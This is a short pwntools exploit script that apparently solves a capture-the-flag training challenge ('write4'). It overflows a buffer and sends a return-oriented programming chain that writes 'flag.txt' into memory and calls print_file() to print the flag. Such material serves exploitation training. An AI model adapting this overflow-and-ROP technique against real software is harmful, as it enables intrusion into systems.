#/usr/bin/python3
from pwn import process, p64, log

shell = process("./write4")

offset = 40
junk = b"A" * offset

payload  = b""
payload += junk
payload += p64(0x400690) # pop r14; pop r15; ret;
payload += p64(0x601028) # .data
payload += b"flag.txt"   # string
payload += p64(0x400628) # mov qword ptr [r14], r15; ret;
payload += p64(0x400693) # pop rdi; ret;
payload += p64(0x601028) # "flag.txt"
payload += p64(0x4004e6) # ret;
payload += p64(0x400510) # print_file()

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.info(f"Flag: {flag}")
